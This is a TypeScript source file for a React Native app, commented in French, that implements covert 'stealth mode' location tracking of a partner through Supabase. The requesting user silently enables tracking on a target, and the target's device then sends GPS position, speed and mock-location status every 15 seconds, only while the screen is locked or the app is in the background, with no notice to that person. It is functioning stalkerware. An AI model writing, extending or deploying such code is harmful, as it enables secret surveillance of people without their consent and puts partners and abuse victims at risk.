/**
 * Service de localisation furtive — migré vers Supabase
 *
 * FONCTIONNEMENT :
 * — L'utilisateur active le mode furtif sur un partenaire.
 * — Une config silencieuse est écrite dans Supabase (stealth_tracking).
 * — Sur l'appareil cible, l'app lit cette config au démarrage / changement d'auth.
 * — La localisation n'est transmise QUE quand l'écran est verrouillé (AppState = background).
 */
import { AppState, AppStateStatus } from 'react-native';
import * as Location from 'expo-location';
import { supabase, TABLES } from '../supabase/config';
import { detectMockLocation } from './MockLocationDetector';

export interface StealthConfig {
  enabled: boolean;
  requesterId: string;
  conversationId: string;
  activatedAt: Date;
}

class StealthLocationService {
  private appStateSubscription: any = null;
  private locationSubscription: Location.LocationSubscription | null = null;
  private isTracking = false;
  private currentUserId: string | null = null;
  private currentConversationId: string | null = null;

  /** Activer le mode furtif sur un partenaire (côté demandeur) */
  async activateStealthMode(
    targetUserId: string,
    requesterId: string,
    conversationId: string
  ): Promise<void> {
    await supabase.from(TABLES.STEALTH_TRACKING).upsert({
      id: targetUserId,
      enabled: true,
      requester_id: requesterId,
      conversation_id: conversationId,
      activated_at: new Date().toISOString(),
    });
  }

  /** Désactiver le mode furtif */
  async deactivateStealthMode(targetUserId: string): Promise<void> {
    await supabase.from(TABLES.STEALTH_TRACKING).delete().eq('id', targetUserId);
    await this.stopStealthTracking();
  }

  /** Lire la config furtive pour un utilisateur donné */
  async getStealthConfig(userId: string): Promise<StealthConfig | null> {
    const { data } = await supabase
      .from(TABLES.STEALTH_TRACKING)
      .select('*')
      .eq('id', userId)
      .single();
    if (!data) return null;
    return {
      enabled: data.enabled,
      requesterId: data.requester_id,
      conversationId: data.conversation_id,
      activatedAt: data.activated_at ? new Date(data.activated_at) : new Date(),
    };
  }

  /** Écoute en temps réel si ce userId est suivi. */
  startListeningForStealthConfig(userId: string): () => void {
    const channel = supabase
      .channel(`stealth:${userId}`)
      .on(
        'postgres_changes',
        {
          event: '*',
          schema: 'public',
          table: TABLES.STEALTH_TRACKING,
          filter: `id=eq.${userId}`,
        },
        async (payload) => {
          if (payload.eventType === 'DELETE') {
            await this.stopStealthTracking();
          } else if (payload.new?.enabled) {
            await this.startStealthTracking(userId, payload.new.conversation_id);
          } else {
            await this.stopStealthTracking();
          }
        }
      )
      .subscribe();

    // Vérifier l'état initial
    this.getStealthConfig(userId).then(async (config) => {
      if (config?.enabled) {
        await this.startStealthTracking(userId, config.conversationId);
      }
    });

    return () => { supabase.removeChannel(channel); };
  }

  async startStealthTracking(userId: string, conversationId: string): Promise<void> {
    if (this.isTracking) return;
    this.isTracking = true;
    this.currentUserId = userId;
    this.currentConversationId = conversationId;

    this.appStateSubscription = AppState.addEventListener(
      'change',
      (state: AppStateStatus) => {
        if (state === 'background' || state === 'inactive') {
          this.startLocationTracking();
        } else {
          this.stopLocationTracking();
        }
      }
    );

    if (AppState.currentState !== 'active') {
      await this.startLocationTracking();
    }
  }

  async stopStealthTracking(): Promise<void> {
    this.isTracking = false;
    this.currentUserId = null;
    this.currentConversationId = null;
    this.appStateSubscription?.remove();
    this.appStateSubscription = null;
    await this.stopLocationTracking();
  }

  private async startLocationTracking(): Promise<void> {
    if (this.locationSubscription) return;
    try {
      this.locationSubscription = await Location.watchPositionAsync(
        {
          accuracy: Location.Accuracy.Balanced,
          timeInterval: 15000,
          distanceInterval: 20,
        },
        (location) => this.publishStealthLocation(location)
      );
    } catch {}
  }

  private async stopLocationTracking(): Promise<void> {
    this.locationSubscription?.remove();
    this.locationSubscription = null;
  }

  private async publishStealthLocation(location: Location.LocationObject): Promise<void> {
    if (!this.currentUserId || !this.currentConversationId) return;
    if (AppState.currentState === 'active') return;

    const mockResult = detectMockLocation(location);

    try {
      await supabase.from(TABLES.LOCATION_SHARES).upsert({
        id: this.currentConversationId,
        user_id: this.currentUserId,
        conversation_id: this.currentConversationId,
        latitude: location.coords.latitude,
        longitude: location.coords.longitude,
        accuracy: location.coords.accuracy ?? null,
        speed: location.coords.speed ?? null,
        is_mocked: mockResult.isMocked,
        is_stealth_update: true,
        updated_at: new Date().toISOString(),
      });
    } catch (err) {
      console.warn('[StealthLocationService] Erreur écriture position :', err);
    }
  }
}

export const stealthLocationService = new StealthLocationService();
